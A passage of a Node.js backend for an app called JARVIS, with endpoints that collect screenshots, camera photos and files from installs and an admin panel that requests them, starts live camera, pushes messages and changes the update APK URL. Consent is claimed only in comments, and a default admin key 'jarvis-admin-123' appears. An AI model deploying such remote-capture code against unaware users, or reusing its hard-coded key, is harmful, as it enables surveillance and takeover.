    if (req.method === "POST" && pathname === "/api/screenshot") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      const image = String(body.image || "");
      if (!installId || !image) return sendJson(res, 400, { error: "install_id and image required" });
      if (!/^[A-Za-z0-9+/=]+$/.test(image)) return sendJson(res, 400, { error: "image must be base64" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      fs.mkdirSync(SHOTS_DIR, { recursive: true });
      fs.writeFileSync(path.join(SHOTS_DIR, safeFileName(installId) + ".jpg"), Buffer.from(image, "base64"));
      user.last_screenshot_at = new Date().toISOString();
      user.last_seen = user.last_screenshot_at;
      saveUsers(users);
      // Consume the request flag so the app sends only one screenshot.
      const cfg = loadConfig();
      if (cfg.screenshot_requested) { delete cfg.screenshot_requested[installId]; saveConfig(cfg); }
      return sendJson(res, 200, { ok: true });
    }

    // ---- POST /api/camera-photo (consent only + owner-requested only)
    if (req.method === "POST" && pathname === "/api/camera-photo") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      const image = String(body.image || "");
      if (!installId || !image) return sendJson(res, 400, { error: "install_id and image required" });
      if (!/^[A-Za-z0-9+/=]+$/.test(image)) return sendJson(res, 400, { error: "image must be base64" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      fs.mkdirSync(CAM_DIR, { recursive: true });
      fs.writeFileSync(path.join(CAM_DIR, safeFileName(installId) + ".jpg"), Buffer.from(image, "base64"));
      user.last_camera_at = new Date().toISOString();
      user.last_seen = user.last_camera_at;
      saveUsers(users);
      const cfg = loadConfig();
      if (cfg.camera_requested) { delete cfg.camera_requested[installId]; saveConfig(cfg); }
      return sendJson(res, 200, { ok: true });
    }

    // ---- POST /api/files (consent only — the app uploads small text files
    // from its own workspace only, when the user allowed monitoring AND gave
    // file permission. Max 10 files, 100 KB each.)
    if (req.method === "POST" && pathname === "/api/files") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      if (!Array.isArray(body.files)) return sendJson(res, 400, { error: "files array required" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      const dir = path.join(FILES_DIR, safeFileName(installId));
      fs.mkdirSync(dir, { recursive: true });
      const stored = [];
      for (const f of body.files.slice(0, 10)) {
        if (!f || typeof f.name !== "string" || typeof f.content !== "string") continue;
        const name = path.basename(f.name).replace(/[^A-Za-z0-9._-]/g, "");
        if (!name || f.content.length > 100_000) continue;
        fs.writeFileSync(path.join(dir, name), f.content, "utf8");
        stored.push(name);
      }
      user.files = stored;
      user.last_seen = new Date().toISOString();
      saveUsers(users);
      return sendJson(res, 200, { ok: true, stored });
    }

    // ---- GET /api/admin/camera-photo/<install_id>
    if (req.method === "GET" && pathname.startsWith("/api/admin/camera-photo/")) {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const id = safeFileName(pathname.slice("/api/admin/camera-photo/".length));
      const file = path.join(CAM_DIR, id + ".jpg");
      if (!fs.existsSync(file)) return sendJson(res, 404, { error: "no camera photo yet" });
      res.writeHead(200, { "Content-Type": "image/jpeg" });
      return fs.createReadStream(file).pipe(res);
    }

    // ---- GET /api/admin/file/<install_id>/<name> (download one stored file)
    if (req.method === "GET" && pathname.startsWith("/api/admin/file/")) {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const parts = pathname.slice("/api/admin/file/".length).split("/");
      const id = safeFileName(parts[0] || "");
      const name = path.basename(parts[1] || "").replace(/[^A-Za-z0-9._-]/g, "");
      const file = path.join(FILES_DIR, id, name);
      if (!name || !fs.existsSync(file)) return sendJson(res, 404, { error: "file not found" });
      res.writeHead(200, { "Content-Type": "application/octet-stream", "Content-Disposition": 'attachment; filename="' + name + '"' });
      return fs.createReadStream(file).pipe(res);
    }

    // ---- GET /api/admin/screenshot/<install_id>
    if (req.method === "GET" && pathname.startsWith("/api/admin/screenshot/")) {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const id = safeFileName(pathname.slice("/api/admin/screenshot/".length));
      const file = path.join(SHOTS_DIR, id + ".jpg");
      if (!fs.existsSync(file)) return sendJson(res, 404, { error: "no screenshot yet" });
      res.writeHead(200, { "Content-Type": "image/jpeg" });
      return fs.createReadStream(file).pipe(res);
    }

    // ---- GET /api/admin/users
    if (req.method === "GET" && pathname === "/api/admin/users") {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const users = loadUsers();
      const devices = loadDevices();
      return sendJson(res, 200, Object.values(users).map((u) => publicUser(u, devices)));
    }

    // ---- GET /api/admin/config
    if (req.method === "GET" && pathname === "/api/admin/config") {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      return sendJson(res, 200, loadConfig());
    }

    // ---- POST /api/admin/config
    if (req.method === "POST" && pathname === "/api/admin/config") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      const cfg = loadConfig();
      if (body.features && typeof body.features === "object") cfg.features = body.features;
      if (body.persona_extra !== undefined) cfg.persona_extra = String(body.persona_extra);
      if (body.announcement !== undefined) cfg.announcement = String(body.announcement);
      if (body.latest_version !== undefined) cfg.latest_version = String(body.latest_version);
      if (body.latest_version_code !== undefined) cfg.latest_version_code = Number(body.latest_version_code) || 0;
      if (body.apk_url !== undefined) cfg.apk_url = String(body.apk_url);
      saveConfig(cfg);
      return sendJson(res, 200, publicConfig(cfg));
    }

    // ---- POST /api/admin/message — send a notification/message to installs.
    // The app shows it as a system notification on its next heartbeat.
    if (req.method === "POST" && pathname === "/api/admin/message") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      const target = String(body.target || "all").trim();
      const title = String(body.title || "").trim().slice(0, 100);
      const text = String(body.body || body.text || "").trim().slice(0, 500);
      if (!title || !text) return sendJson(res, 400, { error: "title and body required" });
      if (target !== "all") {
        const users = loadUsers();
        if (!users[target]) return sendJson(res, 404, { error: "unknown install_id" });
      }
      const cfg = loadConfig();
      cfg.messages = cfg.messages || [];
      const msg = { id: crypto.randomBytes(6).toString("hex"), target, title, body: text, at: new Date().toISOString() };
      cfg.messages.push(msg);
      if (cfg.messages.length > 20) cfg.messages = cfg.messages.slice(-20);
      saveConfig(cfg);
      return sendJson(res, 200, { ok: true, message: msg });
    }

    // ---- POST /api/admin/notify-email — email a user (or all users with an
    // email on file) via Resend. Needs RESEND_API_KEY in env; the user's email
    // only exists when they set it in Jarvis Settings AND turned ON monitoring.
    if (req.method === "POST" && pathname === "/api/admin/notify-email") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      if (!EMAIL_CONFIGURED) {
        return sendJson(res, 400, { error: "Email not configured — set RESEND_API_KEY (and RESEND_FROM) in the Render service env vars and redeploy." });
      }
      const target = String(body.target || "all").trim();
      const subject = String(body.subject || "").trim().slice(0, 150);
      const text = String(body.body || body.text || "").trim().slice(0, 5000);
      if (!subject || !text) return sendJson(res, 400, { error: "subject and body required" });
      const users = loadUsers();
      let recipients = [];
      if (target === "all") {
        recipients = Object.values(users).filter((u) => u.email).map((u) => ({ install_id: u.install_id, email: u.email }));
      } else {
        const u = users[target];
        if (!u) return sendJson(res, 404, { error: "unknown install_id" });
        if (!u.email) return sendJson(res, 400, { error: "No email on file for this user — the user must set their email in Jarvis Settings and turn ON Owner monitoring." });
        recipients = [{ install_id: u.install_id, email: u.email }];
      }
      if (recipients.length === 0) {
        return sendJson(res, 400, { error: "No user has an email on file — users must set their email in Jarvis Settings and turn ON Owner monitoring." });
      }
      const results = [];
      for (const r of recipients) {
        const sent = await sendEmailViaResend(r.email, subject, text);
        results.push({ install_id: r.install_id, email: r.email, sent: sent.ok, status: sent.status });
      }
      const sentCount = results.filter((r) => r.sent).length;
      return sendJson(res, 200, { ok: sentCount > 0, sent: sentCount, total: results.length, results });
    }

    // ---- POST /api/admin/action
    if (req.method === "POST" && pathname === "/api/admin/action") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      const installId = String(body.install_id || "").trim();
      const deviceId = String(body.device_id || "").trim();
      const action = String(body.action || "");
      const users = loadUsers();
      const devices = loadDevices();
      const user = users[installId];
      const days = body.days === undefined || body.days === null ? null : Number(body.days);
      const now = Date.now();

      if (action === "ban_device" || action === "unban_device") {
        const did = deviceId || (user && user.device_id) || "";
        if (!did) return sendJson(res, 400, { error: "no device_id for this install" });
        if (action === "ban_device") {
          devices[did] = { device_id: did, status: "banned", until: null, updated: new Date().toISOString() };
        } else {
          delete devices[did];
        }
        saveDevices(devices);
        return sendJson(res, 200, { ok: true, device_id: did, device_status: action === "ban_device" ? "banned" : "ok" });
      }

      if (action === "request_screenshot") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.screenshot_requested = cfg.screenshot_requested || {};
        cfg.screenshot_requested[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, screenshot_requested: true });
      }

      if (action === "request_camera") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.camera_requested = cfg.camera_requested || {};
        cfg.camera_requested[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, camera_requested: true });
      }

      if (action === "request_live_camera") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.live_camera = cfg.live_camera || {};
        cfg.live_camera[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, live_camera: true });
      }

      if (action === "stop_live_camera") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        if (cfg.live_camera) { delete cfg.live_camera[installId]; saveConfig(cfg); }
        return sendJson(res, 200, { ok: true, live_camera: false });
      }

      if (!user) return sendJson(res, 404, { error: "unknown install_id" });
      if (action === "ban") {
        user.status = "banned";
        user.until = null;
      } else if (action === "suspend") {
        const d = days && days > 0 ? days : 7;
        user.status = "suspended";
        user.until = new Date(now + d * 24 * 3600 * 1000).toISOString();
      } else if (action === "shutdown") {
        user.status = "shutdown";
        user.until = days && days > 0 ? new Date(now + days * 24 * 3600 * 1000).toISOString() : null;
      } else if (action === "restore") {
        user.status = "ok";
        user.until = null;
      } else {
        return sendJson(res, 400, { error: "unknown action (ban|suspend|shutdown|restore|ban_device|unban_device|request_screenshot)" });
      }
      saveUsers(users);
      return sendJson(res, 200, publicUser(user, devices));
    }

    // ---- GET /admin (dashboard)
    if (req.method === "GET" && pathname === "/admin") {
      const key = url.searchParams.get("key") || "";
      if (key !== ADMIN_KEY) return sendHtml(res, 200, keyFormHtml());
      return sendHtml(res, 200, dashboardHtml(loadUsers(), loadDevices(), loadConfig(), key));
    }

    // ---- GET / (short intro)
    if (req.method === "GET" && pathname === "/") {
      return sendHtml(res, 200, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>JARVIS backend</title></head>
<body style="font-family:system-ui,sans-serif;background:#0b0f16;color:#e6f1ff;padding:24px">
<h1 style="color:#22d3ee">JARVIS backend v2</h1>
<p>API is running. Endpoints: <code>GET /health</code>, <code>GET /api/config</code>, <code>POST /api/heartbeat</code>, <code>POST /api/event</code>, <code>POST /api/history</code>, <code>POST /api/screenshot</code>, <code>POST /api/camera-photo</code>, <code>POST /api/files</code>, <code>GET /api/admin/users?key=…</code>, <code>POST /api/admin/action</code>, <code>POST /api/admin/message</code>, <code>POST /api/admin/notify-email</code>, <code>GET /api/admin/config?key=…</code>, <code>POST /api/admin/config</code>, <code>GET /admin?key=…</code></p>
</body></html>`);
    }

    return sendJson(res, 404, { error: "not found" });
  } catch (e) {
    console.error(e);
    if (!res.headersSent) return sendJson(res, 500, { error: "server error" });
    res.end();
  }
});

server.listen(PORT, () => {
  console.log("JARVIS backend v2 listening on port " + PORT);
  if (USING_DEFAULT_KEY) {
    console.log("WARNING: using default ADMIN_KEY (jarvis-admin-123) — set ADMIN_KEY env var!");
  }
});
